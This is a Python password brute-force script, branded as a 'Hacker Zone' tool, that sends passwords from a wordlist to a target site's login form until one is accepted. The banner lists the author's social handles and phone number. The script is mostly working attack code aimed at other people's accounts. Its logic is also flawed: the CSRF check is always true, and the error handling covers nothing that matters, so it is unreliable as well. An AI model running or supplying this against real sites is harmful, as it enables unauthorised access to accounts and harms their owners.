##!/usr/bin/python3
# akashblackhat
print('''\033[96m


  ███    ███  ██████  ███████ ██ ██    ██ ██████  
  ████  ████ ██    ██ ██      ██ ██    ██ ██   ██ 
  ██ ████ ██ ██    ██ ███████ ██ ██    ██ ██████  
  ██  ██  ██ ██    ██      ██ ██ ██    ██ ██   ██ 
  ██      ██  ██████  ███████ ██  ██████  ██   ██ 

\033[1;93m          >>>>>Create by HK MOSIUR<<<<<          
\033[1;92m        [Welcome to HK MOSIUR Hacker Zone]
                  
\033[1;96m       [------------------------------------]
\033[1;96m       [\033[1;97m[+] \033[1;92mOwner   : Hk Mosiur \033[1;96m            ]
\033[1;96m       [\033[1;97m[+] \033[1;92mGitHub  : HKRoky909 \033[1;96m            ]
\033[1;96m       [\033[1;97m[+] \033[1;92mwhatsapp: +8809641033194 \033[1;96m       ]
\033[1;96m       [\033[1;97m[+] \033[1;92mYouTub  : The Ghost Hacker bd \033[1;96m  ]
\033[1;96m       [\033[1;97m[+] \033[1;92mFacebooK: The Ghest Hacker bd \033[1;96m  ]
\033[1;96m       [------------------------------------]         
   ''')

z = '''
>>>\033[1;94mChecking the Server Pliss Wett .........>>>

\033[1;92m [+]███████████████████████████████████████100%█>
'''

import requests
import time
import sys

url = input("[+] Enter Target ID/Url:")
username = input("Enter Target Username: ")
error = input("Enter Wrong Password Error Message: ")

for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)

try:
    def bruteCracking(username, url, error):
        count = 0
        for password in passwords:
            password = password.strip()
            count = count + 1
            print("Trying Password: " + str(count) + ' Time For => ' + password)
            data_dict = {"LogInID": username, "Password": password, "Log In": "submit"}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
                pass
            elif "CSRF" or "csrf" in str(response.content):
                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                exit()
            else:
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")

with open("passwords.txt", "r") as passwords:
    bruteCracking(username, url, error)

print("[!!] password not in list")
